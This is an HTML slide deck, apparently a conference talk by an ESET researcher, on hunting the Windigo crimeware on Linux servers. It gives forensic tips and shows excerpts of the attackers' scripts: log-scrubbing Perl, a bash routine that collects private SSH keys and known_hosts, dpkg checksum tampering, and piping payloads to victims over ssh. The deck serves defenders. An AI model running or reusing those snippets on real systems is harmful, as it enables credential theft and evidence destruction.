<!DOCTYPE html><html lang="en"><head><meta charset="utf-8" /><meta name="author" content="Olivier Bilodeau" /><title>Windigo backstory</title><meta content="yes" name="apple-mobile-web-app-capable" /><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style" /><meta content="width=(device-width, initial-scale=1.0, maximum-scale=1.0,)user-scalable=no" name="viewport" /><link href="reveal.js/css/reveal.min.css" rel="stylesheet" /><link rel="stylesheet" href="reveal.js/css/theme/eset.css" id="theme" /><link href="reveal.js/lib/css/zenburn.css" rel="stylesheet" /><script type="text/javascript">document.write( '<link rel="stylesheet" href="css/print/' + ( window.location.search.match( /print-pdf/gi ) ? 'pdf' : 'paper' ) + '.css" type="text/css" media="print">' );</script></head><body><div class="reveal"><div class="slides"><section id="_hunting_malware_on_linux_production_servers"><h2>Hunting Malware on Linux Production Servers</h2><div class="paragraph"><p>The Windigo Backstory</p></div>
<div class="paragraph"><p>Olivier Bilodeau, ESET (<a href="http://twitter.com/obilodeau">@obilodeau</a>)</p></div></section>
<section id="__apropos"><h2>:~$ apropos</h2><div class="ulist"><ul><li><p>Reminder: Operation Windigo</p></li><li><p>Finding Linux/Ebury</p><div class="ulist"><ul><li><p>Case expansion: Honeynet</p></li><li><p>Deployment and lack of persistence</p></li></ul></div></li><li><p>Escalading the Linux/Calfbot (Spambot)</p><div class="ulist"><ul><li><p>Case expansion: Attacks on C&amp;C encrypted trafic</p></li></ul></div></li><li><p>Operators network evasion</p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>and we&#8217;ll have defense and investigation tips along the way</p></div></aside></section>
<section id="__whoami"><h2>:~$ whoami</h2><div class="paragraph"><p>Olivier Bilodeau</p></div>
<div class="ulist"><ul><li><p>Malware Researcher at ESET</p></li><li><p>InfoSec Lecturer at ETS University in Montreal Canada</p></li><li><p>Previously Perl developer, Sysadmin, &#8230;&#8203;</p></li><li><p>I have been doing CTFs for a while<br />
<span class="image"><img src="images/AmishSec.png" alt="AmishSec" width="20%" /></span> <span class="image"><img src="images/groupies.png" alt="groupies" width="20%" /></span></p></li><li><p>Co-founded <a href="http://montrehack.ca">MontreHack</a> local CTF training initiative</p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>worked directly on the Operation Windigo report and reversing of the Perl
spambot and data analysis</p></div>
<div class="paragraph"><p>I applied for a 50m slot sorry for the removed depth</p></div></aside></section>
<section id="_what_is_operation_windigo"><h2>What is Operation Windigo?</h2><div class="paragraph"><p>Crimeware operation consisting of several malware components - Linux/Ebury,
Linux/Cdorked and Perl/Calfbot - where the infrastructure is mostly operated on
compromised servers.</p></div></section>
<section id="_operation_windigo"><h2>Operation Windigo</h2><div class="paragraph"><p>a joint investigation effort</p></div>
<div class="paragraph"><p><span class="image"><img src="images/cert-bund.png" alt="cert-bund" /></span> <span class="image"><img src="images/cern.png" alt="cern" /></span> <span class="image"><img src="images/eset.png" alt="eset" /></span> <span class="image"><img src="images/snic.png" alt="snic" /></span></p></div>
<aside class="notes"><div class="ulist"><ul><li><p>The Ebury Working Group</p></li></ul></div></aside></section>
<section id="_linux_ebury"><h2>Linux/Ebury</h2><div class="ulist"><ul><li><p>OpenSSH backdoor</p><div class="ulist"><ul><li><p>Before: replacing original binaries</p></li><li><p>Then: replaces libkeyutils library and hooks OpenSSH address space</p></li><li><p>Now: replaces libkeyutils library which load lbns2.so and hooks OpenSSH address space</p></li></ul></div></li><li><p>Provides a shell to the operators</p></li><li><p>Steals SSH credentials and keys</p><div class="ulist"><ul><li><p>When connecting <strong>to</strong> and <strong>from</strong> machine</p></li></ul></div></li></ul></div></section>
<section id="_linux_cdorked"><h2>Linux/Cdorked</h2><div class="ulist"><ul><li><p>httpd/nginx/lighttpd backdoor</p><div class="ulist"><ul><li><p>Replacing binaries</p></li></ul></div></li><li><p>Redirects end-users to exploit kits or adult reference programs</p><div class="ulist"><ul><li><p>Stealthy: Only once per IP per day (configurable)</p></li></ul></div></li></ul></div></section>
<section id="_perl_calfbot"><h2>Perl/Calfbot</h2><div class="ulist"><ul><li><p>Perl spamming daemon</p></li><li><p>Deletes itself when running, resides only in memory</p></li><li><p>Hides as <code>crond</code></p></li></ul></div></section>
<section id="_compromised_infrastructure"><h2>Compromised infrastructure</h2><div class="paragraph"><p><span class="image"><img src="images/windigo_big_picture.png" alt="windigo_big_picture" /></span></p></div>
<aside class="notes"><div class="ulist"><ul><li><p>I know its small</p></li><li><p>operators at the bottom, victims on top</p></li><li><p>layers of compromised servers separates them</p></li><li><p>proxy servers, DNAT, DNS servers, Web servers, C&amp;C all run on Ebury infected
machines</p></li></ul></div></aside></section>
<section id="_how_does_it_expand"><h2>How does it expand?</h2><div class="paragraph"><p><span class="image"><img src="images/infection_scenario.png" alt="infection_scenario" /></span></p></div>
<aside class="notes"><div class="ulist"><ul><li><p>See, it&#8217;s all about stolen credentials</p></li><li><p>SSH gateways are especially bad</p></li><li><p>mention cpanel support server compromise</p></li><li><p>Stop using passwords, consider Two-Factor Auth</p></li></ul></div></aside></section>
<section id="_how_can_it_do_so"><h2>How can it do so?</h2><div class="paragraph"><p><span class="image"><img src="images/leaked_password_root_vs_nonroot.png" alt="leaked_password_root_vs_nonroot" /></span></p></div></section>
<section id="_why_advanced"><h2>Why advanced?</h2><div class="ulist"><ul><li><p>Stealth</p><div class="ulist"><ul><li><p>close to no disk persistence</p></li><li><p>uses shared memory</p></li><li><p>hooks into binaries</p></li><li><p>do not affect existing services</p></li></ul></div></li><li><p>Effective</p><div class="ulist"><ul><li><p>large number of compromised servers</p></li><li><p>validates spamming</p></li><li><p>maximizes available server resources</p></li></ul></div></li></ul></div>
<aside class="notes"><div class="ulist"><ul><li><p>libkeyutils, is a real system library so this is nasty</p></li><li><p>looking for hashes of daemons not enough (libkeyutils, a real library)</p></li></ul></div></aside></section>
<section id="_protip" data-background="#125F79"><h2>Protip</h2><div class="ulist"><div class="title">Shared memory (<code>shm</code>) analysis</div><ul><li><p><code>ipcs</code></p></li><li><p><code>shmcat</code>, <a href="http://sourceforge.net/projects/shmcat/" class="bare">http://sourceforge.net/projects/shmcat/</a></p></li></ul></div></section>
<section id="_protip_2" data-background="#125F79"><h2>Protip</h2><div class="listingblock"><div class="content"><pre class="highlight"><code># ipcs -m
------ Shared Memory Segments --------
key        shmid      owner     perms      bytes     nattch
[...]
0x000010e0 465272836  root      600        3282312    0

# ipcs -m -p
------ Shared Memory Creator/Last-op PIDs --------
shmid      owner      cpid       lpid
[...]
465272836  root       15029      17377

# ps aux | grep 15029
[...]
root     15029  0.0  0.0  66300  1204 ?        Ss   Jan26   0:00 /usr/sbin/sshd

# shmcat -m 465272836 &gt; shm_dump</code></pre></div></div>
<aside class="notes"><div class="paragraph"><p>Anything created or used by <code>sshd</code> is suspicious.
OpenSSH doesn&#8217;t do such a thing.</p></div></aside></section>
<section id="_money_trail"><h2>Money trail</h2><div class="ulist"><ul><li><p>Install malware on Windows end-users</p><div class="ulist"><ul><li><p>Exploit Kit: Flashpack, Blackhole, RIG</p></li><li><p>Win32/Glupteba (more spam capability)</p></li></ul></div></li><li><p>Spam</p><div class="ulist"><ul><li><p>Mostly adult affiliate programs links</p></li><li><p>Some Casino</p></li></ul></div></li><li><p>Web-site redirections to adult affiliate programs</p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>before was Win32/Boaxxe (click fraud) dep on country</p></div></aside></section>
<section id="_impact"><h2>Impact</h2><div class="ulist"><ul><li><p>25 000+ compromised servers</p></li><li><p>500 000 browser redirections per day (20% go to exploit packs)</p></li><li><p>35M+ spam sent per day</p></li><li><p>kernel.org infected at some point in 2011</p></li></ul></div>
<aside class="notes"><div class="ulist"><ul><li><p>There is an ongoing law enforcement investigation</p></li></ul></div></aside></section>
<section id="_recap" data-background="#797620"><h2>Recap</h2><div class="ulist step"><ul><li class="fragment"><p>Operation Windigo is real</p></li><li class="fragment"><p>It&#8217;s all operated on compromised servers</p></li><li class="fragment"><p>Stop using passwords, consider Two-Factor Auth</p></li><li class="fragment"><p>Shared memory: <code>ipcs</code>, <code>shmcat</code></p></li></ul></div>
<aside class="notes"><div class="ulist"><ul><li><p>ssh keys are good but not if they are stored on servers use ssh-agent
instead</p></li></ul></div></aside></section>
<section id="_finding_linux_ebury"><h2>Finding Linux/Ebury</h2><div class="ulist"><ul><li><p>We analyzed Cdorked (hat tip Sucuri)</p></li><li><p>Blog post in Spring 2013</p></li><li><p>Then found SSH backdoor samples</p></li></ul></div>
<aside class="notes"><div class="ulist"><ul><li><p>Named it SSHDoor</p></li><li><p>while analyzing it we found</p></li></ul></div></aside></section>
<section id="_same_crypto_code"><h2>Same crypto code</h2><div class="paragraph"><p><span class="image"><img src="images/cdorked_crypto.png" alt="cdorked_crypto" /></span> <span class="image"><img src="images/ebury_crypto.png" alt="ebury_crypto" /></span></p></div>
<div class="paragraph"><p>Cdorked | Ebury</p></div></section>
<section id="_from_there"><h2>From there</h2><div class="ulist"><ul><li><p>Reversed the domain generation algorithm (DGA)</p></li><li><p>Had access to exfiltration server</p><div class="ulist"><ul><li><p>Witnessed 7000 infected servers</p></li></ul></div></li><li><p>Access to compromised systems through notifications</p></li></ul></div>
<aside class="notes"><div class="ulist"><ul><li><p>Named Ebury by Steinar H. Gunderson in Nov 2011</p></li><li><p>Exfil server was operated by a known contact. Then we realized it was big.</p></li><li><p>Cleaning then noticing reinfections, seeing the spread we realized that this
was all about stolen credentials</p></li></ul></div></aside></section>
<section id="_case_expansion"><h2>Case expansion</h2><div class="paragraph"><p>How to spy on a malicious user with the same privileges?</p></div>
<div class="ulist step"><ul><li class="fragment"><p>syslog: omits logging</p></li><li class="fragment"><p>package manifests: tampered</p></li><li class="fragment"><p>tcpdump: Ebury stops on <code>IFF_PROMISC</code>, ssh is encrypted</p></li><li class="fragment"><p>core dumping processes and shared memory: long</p></li><li class="fragment"><p>auditd!</p></li></ul></div></section>
<section id="_protip_3" data-background="#125F79"><h2>Protip</h2><div class="paragraph"><p><em>The Linux audit framework provides an auditing system that reliably collects
information about any security-relevant (or non-security-relevant) event on a
system.</em></p></div>
<div class="paragraph"><p>Using it we were able to gather intelligence without tipping off the malware
group. We logged all <code>execve</code> calls.</p></div>
<aside class="notes"><div class="paragraph"><p>now their recon script checks if auditd is activated</p></div></aside></section>
<section id="_protip_4" data-background="#125F79"><h2>Protip</h2><div class="listingblock"><div class="content"><pre class="highlight"><code>type=EXECVE msg=audit(1373838239.340:4474200): argc=4 a0="rm" a1="-f" a2="-f" a3="/tmp/q"
type=CWD msg=audit(1373838239.340:4474200):  cwd="/home/tmpp/openssh-5.9p1"
type=PATH msg=audit(1373838239.340:4474200): item=0 name="/bin/rm"
\- inode=22282288 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00
type=PATH msg=audit(1373838239.340:4474200): item=1 name=(null) inode=4456796
\- dev=08:01 mode=0100755 ouid=0 ogid=0 rdev =00:00
type=SYSCALL msg=audit(1373838239.341:4474201): arch=c000003e syscall=59
\- success=yes exit=0 a0=1f29d40 a1=1eec5f0 a2=1f 03ec0 a3=7fffd6be9a60
\- items=2 ppid=13403 pid=21287 auid=501 uid=0 gid=0 euid=0
\- suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty =pts0 ses=128232 comm="touch" exe="/bin/touch" key=(null)
type=EXECVE msg=audit(1373838239.341:4474201): argc=4 a0="touch" a1="-r"
\- a2="/etc/ssh/sshd_config" a3="/etc/ssh/ssh_config"</code></pre></div></div></section>
<section id="_protip_5" data-background="#125F79"><h2>Protip</h2><div class="paragraph"><p>On non-ascii arguments it switches to hex</p></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>type=EXECVE msg=audit(1373837952.278:4473290): argc=26 a0="gcc" a1="-g"
a2="-O2" a3="-Wall" a4="-Wpointer-arith" a5="-Wuninitialized"
a6="-Wsign-compare" a7="-Wformat-security" a8="-Wno-pointer-sign"
a9="-Wno-unused-result" a10="-fno-strict-aliasing" a11="-fno-builtin-memset"
a12="-fstack-protector-all" a13="-I." a14="-I."
a15=2D445353484449523D222F6574632F73736822 a16=2D445F504154485F5353485F50
524F4752414D3D222F7573722F6C6F63616C2F62696E2F73736822
[...]
a21=2D445F504154485F5353485F5049444449523D222F7661722F72756E22
a22=2D445F504154485F505249565345505F4348524F4F545F4449523D222F7661722F656D70747922
a23="-DHAVE_CONFIG_H" a24="-c" a25="rsa.c"

$ ipython
in [1]: ('2D445F504154485F5353485F504B435331315F48454C504552'
        '3D222F7573722F6C6F63616C2F6C6962657865632F7373682D'
        '706B637331312D68656C70657222').decode('hex')
Out[2]: '-D_PATH_SSH_PKCS11_HELPER="/usr/local/libexec/ssh-pkcs11-helper"'</code></pre></div></div></section>
<section id="_missing_out"><h2>Missing out</h2><div class="ulist"><ul><li><p>Still not entirely satisfied</p></li></ul></div></section>
<section id="_going_out_of_band"><h2>Going out-of-band</h2><div class="ulist"><ul><li><p>Built a man-in-the-middle ssh gateway</p><div class="ulist"><ul><li><p>Operators don&#8217;t have Servers' HostKeys</p></li><li><p>So it could work!</p></li></ul></div></li><li><p>We leaked credentials</p><div class="ulist"><ul><li><p>we waited&#8230;&#8203;</p></li><li><p>And it worked!</p></li></ul></div></li></ul></div>
<aside class="notes"><div class="paragraph"><p>We used the venerable mitm-ssh from cmn at signedness.org</p></div></aside></section>
<section id="_as_simple_as_that"><h2>As simple as that</h2><div class="listingblock"><div class="content"><pre class="highlight"><code>              /--------------- &lt;CLOUD&gt; --------------------\

                        WAN            DMZ
              Internet &lt;---&gt; gateway  &lt;---&gt; Server
                            (mitm-ssh)  (some fake workload)

              \--------------- &lt;/CLOUD&gt; -------------------/</code></pre></div></div>
<aside class="notes"><div class="ulist"><ul><li><p>Forwarding a few ports.</p></li><li><p>Simulating a DMZ (which ebury supports)</p></li></ul></div></aside></section>
<section id="_devops_operators"><h2>Devops operators?</h2><div class="ulist"><ul><li><p>Found very interesting monitoring and deployments scripts</p></li><li><p>Interesting usage (SSH stream redirections):</p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>cat payload.pl | ssh victim perl
# or
cat payload.sh | ssh victim bash</code></pre></div></div>
<aside class="notes"><div class="ulist"><ul><li><p>Leaves little traces since</p><div class="ulist"><ul><li><p>stdin is from operator</p></li><li><p>stdout/stderr goes to him</p></li></ul></div></li><li><p>Explains why we saw nothing in auditd</p></li></ul></div></aside></section>
<section id="_recon_deployment_scripts"><h2>Recon / Deployment scripts</h2><div class="ulist"><ul><li><p>Written in Perl</p></li><li><p>Always reports to <code>STDOUT</code></p><div class="ulist"><ul><li><p>Errors</p></li><li><p>Status</p></li></ul></div></li></ul></div></section>
<section id="_perl_scripts"><h2>Perl scripts</h2><div class="ulist"><ul><li><p>Not obfuscated</p></li><li><p>But as readable as Perl can be</p></li></ul></div>
<div class="paragraph"><p><span class="image"><img src="images/perl.jpg" alt="perl" /></span></p></div></section>
<section id="_eliminates_evidence"><h2>Eliminates evidence</h2><div class="listingblock"><div class="content"><pre class="highlight"><code>`mkdir -p /home/tmpq`; $tfile = '/home/tmpq/q3def';
@blist=`find  /var/log -type f -mtime -1 -size +100M -ls`; print @blist if @blist;
@logs=`cat /etc/syslog.conf|grep -vi \"#\"|grep -vi dev`;
foreach (@logs) {$logs{$1}++ if m|.*?(/.+)| and not m|/mail| }
foreach $file (keys %logs) {
    next if checktime($file); # print "Check $file\n";
    $system="cat $file|egrep -i \"$n_date\"|egrep -i \"$string\""; #print "$system\n";
    $test=`$system`; print "Found in $file. Try to correct\n" if $test; next unless $test;
    $system="cat $file|egrep -vi \"$n_date\"&gt;$tfile;cat $file|egrep \"$n_date\"|egrep -vi \"$string\"\&gt;&gt;$tfile;cat $tfile&gt;$file;rm -f $tfile";
#    print "$system\n"; #!
    system($system) }</code></pre></div></div>
<aside class="notes"><div class="ulist"><ul><li><p>Parses syslog.conf to eliminate ANY logline that has:</p><div class="ulist"><ul><li><p>username</p></li><li><p>'Failed password'</p></li><li><p>IP</p></li></ul></div></li><li><p>Avoids large files &gt;100Mb</p></li><li><p>Moves on to any file in /var/log/ except a blacklist</p></li></ul></div></aside></section>
<section id="_protip_6" data-background="#125F79"><h2>Protip</h2><div class="ulist"><div class="title">Reverse-engineering Perl</div><ul><li><p>Use <code>perltidy</code> to prettify Perl</p></li><li><p>Rename variables</p><div class="ulist"><ul><li><p>vim: * then <code>cim</code> then (<code>n</code> then <code>.</code>).repeat()</p></li><li><p>or your search/replace of <code>$EDITOR</code></p></li></ul></div></li><li><p>For packed scripts use <code>B::Deparse</code></p></li></ul></div>
<aside class="notes"><div class="ulist"><ul><li><p>B::Deparse does impressive stuff on heavily obfuscated perl code</p></li><li><p>but afterwards, its still Perl :P</p></li></ul></div></aside></section>
<section id="_scripts_cont"><h2>scripts (cont)</h2><div class="ulist"><ul><li><p>Checks for LD_PRELOAD trickery</p></li><li><p>Various restrictive <code>ssh</code> configurations</p></li><li><p>BSD jails</p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>if (-l '/bin') {
    print "\n\tlALERT!!! /bin is link, seems like bsd jail\n";
    $alert++
}</code></pre></div></div>
<div class="ulist"><ul><li><p>CPanel, BRadmin, Nagios ipcs plugin, auditd</p></li></ul></div></section>
<section id="_recon_script_cont"><h2>Recon script (cont)</h2><div class="ulist"><ul><li><p>Generic <code>ssh</code> honeypots</p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>@sd = `strings /usr/sbin/sshd |grep -e "^/usr/local/libexec"`;
chomp @sd;
if (@sd) { print "\n\tALERT!!! , ".join("|",@sd)."\n" }
my $ppid=getppid;
my $pb=readlink("/proc/$ppid/exe");
if ($pb ne '/usr/sbin/sshd') {
    print "\n\tlALERT!!! parent:$pb, $ppid\n";
    $alert++
}</code></pre></div></div></section>
<section id="_recon_script_cont_2"><h2>Recon script (cont)</h2><div class="ulist"><ul><li><p>Detects available tools (pkg mgmt, gcc, patch, &#8230;&#8203;)</p></li><li><p>Check for header files to compile OpenSSH</p></li><li><p>Check if Ebury is already installed</p></li></ul></div></section>
<section id="_deployment_script"><h2>Deployment script</h2><div class="ulist"><ul><li><p>Uses Perl&#8217;s <em>DATA</em> to pass files through <code>ssh</code></p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>open(TAR,"| tar zxf - $ln $sl");
binmode(DATA);
while(&lt;DATA&gt;) {
    print TAR $_;
}
close TAR;

__DATA__
^_&lt;8b&gt;^H^@VÃÇS^@^Cí½    X^TÇÖ0Ü3Ì("0hÀ¨^Q^]^U#î&lt;8e&gt;&lt;82&gt;+( è h^@^E&lt;
8c&gt;¸¯&lt;88&gt;^K^Fg^T^W^PÒ`hÚ6ÞKÌÍ¢Ù4Ñ71jbôÆ^]\@&lt;8c&gt;^Z%Æ%j$Æhã&lt;98&gt;&lt;88&gt;&lt;
9a&gt;¸kÿç&lt;9c&gt;ê&lt;86&gt;&lt;81&gt;ÈûÝÿû&lt;9e&gt;÷{&lt;9e&gt;ÿùimªêÔ©Sû©sªjúÌ&lt;9e&gt;9yñâ^^&lt;96&gt;i
&lt;93&gt;¹ÿ¹§;&lt;½^B^BÈ&lt;85&gt;§&lt;86&gt;Û»gïÀî&lt;9c&gt;¥GÏ^&lt;96&gt;Þ^AÝ^CÁßÝbéÙ£^Ggîþ?X¦ÊÇ
&gt;ß6)ÕlæRSRlÿ^]Þÿ*þÿ£Ï²&lt;88&gt;¨Áz&lt;9d&gt;®2ìÂ^Mà0Ô½1^K&lt;87&gt;¨pÿ×ªÒ&lt;84&gt;p}¸zð÷</code></pre></div></div>
<aside class="notes"><div class="ulist"><ul><li><p>Special literal that allows to embed binary data in a Perl script</p></li><li><p>avoids having them to fetch additional stuff (less visible)</p></li><li><p>the DATA is real binary, not the vim shit I pasted here</p></li></ul></div></aside></section>
<section id="_deployment_script_cont"><h2>Deployment script (cont)</h2><div class="paragraph"><p>Altering package management manifests</p></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>sub fix_md5 {
    my @df = glob("/var/lib/dpkg/info/libkeyutils1*.md5sums");
    get_md5();
    open( $fh, "&lt;$df" );
    my @q = &lt;$fh&gt;;
    close $fh;
    for (@q) {
        $c++ if s|\S+  $d1/$rfile\n|$md5  $d1/$rfile\n|
    }

    open( $fh, "&gt;$df" );
    print $fh @q;
    close $fh;
    print "md5fix: fixed lines: $c\n";
}</code></pre></div></div>
<aside class="notes"><div class="ulist"><ul><li><p>this is the debian version</p></li><li><p>I cleaned it up a bit so it&#8217;ll fit the screen</p></li></ul></div></aside></section>
<section id="_daily_monitoring_script"><h2>Daily monitoring script</h2><div class="ulist"><ul><li><p>Bash</p></li><li><p>Grabs keys, known hosts, user ssh configs</p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>echo __% Passwd
cat /etc/passwd
# [...]
ud=`awk -F':' '{print $6}' &lt;/etc/passwd|sort -u`;
echo __% KHosts
for f in $ud;do cat $f/.ssh/known_hosts 2&gt;/dev/null;done
echo __% SSHConf
for f in $ud;do cat $f/.ssh/config 2&gt;/dev/null &amp;&amp; echo _%__${f};done
echo __% SSHKeys_priv
for f in $ud;do
[ -e $f/.ssh/id_rsa ] &amp;&amp; { echo _%__$f/.ssh/id_rsa;cat $f/.ssh/id_rsa;echo; }
[ -e $f/.ssh/id_dsa ] &amp;&amp; { echo _%__$f/.ssh/id_dsa;cat $f/.ssh/id_dsa;echo; } done</code></pre></div></div></section>
<section id="_other_scripts_findings"><h2>Other scripts findings</h2><div class="ulist"><ul><li><p>Modifies SELinux policy</p></li><li><p>Various styles of installation</p><div class="ulist"><ul><li><p>precompiled libraries</p></li><li><p>on-site compilation</p></li><li><p>packages</p></li></ul></div></li><li><p>Looks for over 40 backdoors/rootkits</p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>some are not even publicly documented</p></div></aside></section>
<section id="_recap_2" data-background="#797620"><h2>Recap</h2><div class="ulist step"><ul><li class="fragment"><p>full interaction honeypot allowed us to move further</p></li><li class="fragment"><p><code>auditd</code>, <code>mitm-ssh</code> are good tools</p></li><li class="fragment"><p>this malware group knows Linux and have seen stuff</p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>and compromised people giving us shells on their boxes</p></div></aside></section>
<section id="_how_we_first_met_perl_calfbot"><h2>How we first met Perl/Calfbot</h2><div class="ulist"><ul><li><p>Replay attack on one of those URLs</p></li><li><p>Built Calfbot fake client using operator&#8217;s own code</p></li><li><p>First layer C&amp;C on Ebury infected machines</p></li></ul></div>
<aside class="notes"><div class="ulist"><ul><li><p>fake client for the lulz! (because we can!)</p></li><li><p>fetched spam templates and email targets</p></li><li><p>protect our customers</p></li></ul></div></aside></section>
<section id="_how_big_is_this_thing"><h2>How big is this thing?</h2><div class="paragraph"><p>Bot reports the # of successful spam sent</p></div>
<div class="paragraph"><p><span class="image"><img src="images/cnc_url.png" alt="cnc_url" /></span></p></div></section>
<section id="_the_situation_is"><h2>The situation is</h2><div class="ulist step"><ul><li class="fragment"><p>We have shell access to the current first layer C&amp;C</p></li><li class="fragment"><p>Traffic is SSL and goes through an nginx reverse proxy</p></li><li class="fragment"><p>nginx binary is gone, config is gone but not the private key!</p></li><li class="fragment"><p>Remote end of the proxy is beyond reach (no collaboration)</p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>Most client even supported perfect forward secrecy! We didn&#8217;t expect that.</p></div></aside></section>
<section id="_our_move"><h2>Our move</h2><div class="ulist step"><ul><li class="fragment"><p>Dumped process memory (<code>pid</code> via <code>netstat</code>)</p><div class="ulist"><ul><li><p><code>gcore pid</code></p></li></ul></div></li><li class="fragment"><p>Extracted binary from <code>/proc</code></p></li><li class="fragment"><p>Extracted config from dump and binary</p></li><li class="fragment"><p>Modified config to weaken SSL suite</p><div class="listingblock"><div class="content"><pre class="highlight"><code>-        ssl_ciphers             HIGH:!aNULL:!MD5;
+        ssl_ciphers             AES128-SHA;</code></pre></div></div></li></ul></div>
<aside class="notes"><div class="ulist"><ul><li><p>Used IDA to extract config</p></li><li><p>Interestingly enough the NULL cipher didn&#8217;t work (unsupported, prob. for a
good reason)</p></li><li><p>and we couldn&#8217;t bump SSL, clients were expecting it</p></li><li><p>w/ private AES128-SHA pcaps are manageable by tshark/wireshark</p></li></ul></div></aside></section>
<section id="_protip_7" data-background="#125F79"><h2>Protip</h2><div class="ulist"><ul><li><p><code>proc</code> allows you to extract deleted executables</p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code># normal
$ sudo ls -l /proc/17902/exe
lrwxrwxrwx 1 root root 0 Sep 26 13:11 /proc/17902/exe -&gt; \
\- /home/olivier/src/nginx-1.5.3/nginx
$ sha1sum /home/olivier/src/nginx-1.5.3/nginx
fbb493f83e67a651ccbbf73a5ad22ca6719c19e4  /home/olivier/src/nginx-1.5.3/nginx

$ sudo rm /home/olivier/src/nginx-1.5.3/nginx

# removed
$ sudo ls -l /proc/17902/exe
lrwxrwxrwx 1 root root 0 Sep 26 13:11 /proc/17902/exe -&gt; \
\- /home/olivier/src/nginx-1.5.3/nginx (deleted)

$ sudo cp /proc/17902/exe ./nginx
$ sha1sum nginx
fbb493f83e67a651ccbbf73a5ad22ca6719c19e4  nginx</code></pre></div></div></section>
<section id="_protip_8" data-background="#125F79"><h2>Protip</h2><div class="ulist"><ul><li><p>We&#8217;ve seen calfbot hide as <code>crond</code> in <code>ps -ef</code> output</p><div class="ulist"><ul><li><p>Simple in Perl: <code>$0 = "crond";</code></p></li></ul></div></li><li><p><code>proc</code> allows also to inspect for that</p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code># clean
$ pgrep -x "cron" | sudo xargs -I '{}' ls -la "/proc/{}/exe"
lrwxrwxrwx 1 root root 0 Sep 25 13:35 /proc/1389/exe -&gt; /usr/sbin/cron

# suspicious
$ pgrep -x "cron" | sudo xargs -I '{}' ls -la "/proc/{}/exe"
lrwxrwxrwx 1 root root 0 Sep 25 13:21 /proc/666/exe -&gt; /usr/bin/perl</code></pre></div></div></section>
<section id="_protip_9" data-background="#125F79"><h2>Protip</h2><div class="ulist"><ul><li><p><code>lsof</code>: to list all files used by process</p></li><li><p><code>netstat</code>: to list his sockets</p></li><li><p><code>ipcs</code>: shared memory</p></li><li><p><code>strace</code>: what it is doing</p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>don&#8217;t have time for more than this sorry</p></div></aside></section>
<section id="_protip_10" data-background="#125F79"><h2>Protip</h2><div class="paragraph"><p>Always copy everything from /proc/$pid before killing a process</p></div>
<aside class="notes"><div class="paragraph"><p>unrelated to windigo but we&#8217;ve seen encrypted scripts where the key was in an
environment variable unpacking itself (w/o it we couldn&#8217;t do anything even w/
the script)</p></div></aside></section>
<section id="_our_move_cont"><h2>Our move (cont)</h2><div class="ulist"><ul><li><p>Replace config and original binary</p></li><li><p>nginx <code>SIGHUP</code></p></li><li><p>Delete config and binary</p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>nginx sighup awesome: master process never killed, connections never dropped</p></div>
<div class="paragraph"><p>This was all with instructions given by email to a 3rd party so it was a
pretty stressfull experience haha</p></div></aside></section>
<section id="_success"><h2>SUCCESS</h2><div class="paragraph"><p><span class="image"><img src="images/os_distribution.png" alt="os_distribution" /></span></p></div>
<aside class="notes"><div class="ulist"><ul><li><p>Eavesdrop all C&amp;C traffic</p></li><li><p>Learned a lot</p></li></ul></div></aside></section>
<section id="_recap_3" data-background="#797620"><h2>Recap</h2><div class="ulist step"><ul><li class="fragment"><p>You can mitm the bad guys</p><div class="ulist"><ul><li><p>If you have permission</p></li></ul></div></li><li class="fragment"><p><code>proc</code> is awesome</p><div class="ulist"><ul><li><p>bring binaries back from the dead</p></li><li><p>copy it before killing a malicious process</p></li></ul></div></li><li class="fragment"><p>Use <code>lsof</code>, <code>netstat</code>, <code>strace</code> to understand processes</p></li></ul></div></section>
<section id="_network_evasion"><h2>Network evasion</h2><div class="ulist"><ul><li><p>SSH tunnels</p></li><li><p>nginx reverse proxies</p></li><li><p>IP in IP tunnels</p></li><li><p>3Proxy</p></li></ul></div></section>
<section id="_ssh_tunnels"><h2>SSH tunnels</h2><div class="ulist"><ul><li><p>Through infected servers</p></li><li><p>Used to send spam</p></li></ul></div>
<div class="paragraph"><p><span class="image"><img src="images/ssh_tunnel_spam.png" alt="ssh_tunnel_spam" /></span></p></div>
<aside class="notes"><div class="ulist"><ul><li><p>high # of IPs to avoid blacklisting</p></li><li><p>Usual reason why people know they are infected and want to do something about
it. via spamhaus blocking</p></li><li><p>We think its used by the Glupteba infected hosts</p></li></ul></div></aside></section>
<section id="_nginx_reverse_proxies"><h2>nginx reverse proxies</h2><div class="ulist"><ul><li><p>Through infected servers</p></li><li><p>Layers of redirection in front of the Calfbot C&amp;C</p></li><li><p>Layers of redirection in front of the Exploit Kit hosting</p></li><li><p>Binary often in odd location (<code>/boot/sbin/nginx</code>)</p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>Not that stealthy I must admit</p></div></aside></section>
<section id="_nginx_cdorked_config_example"><h2>nginx Cdorked config example</h2><div class="listingblock"><div class="content"><pre class="highlight"><code>upstream backend_servers {
    server xx.xxx.118.201:xx05  max_fails=1 fail_timeout=600s weight=25
    [... other servers ...]
}

server {
    listen 80
    access_log /dev/null

    location / {
        proxy_pass http://backend_servers
        proxy_set_header Host $http_host
        proxy_redirect off
        proxy_set_header X-Real-IP $remote_addr
        proxy_set_header X_Forwarded-For $proxy_add_x_forwarded_for ; X_For.. is not a typo
        [... performance things ...]
    }
}</code></pre></div></div></section>
<section id="_nginx_calfbot_config_example"><h2>nginx Calfbot config example</h2><div class="listingblock"><div class="content"><pre class="highlight"><code>...
upstream backend_servers {
    server xxx.x.36.17:4xx35;
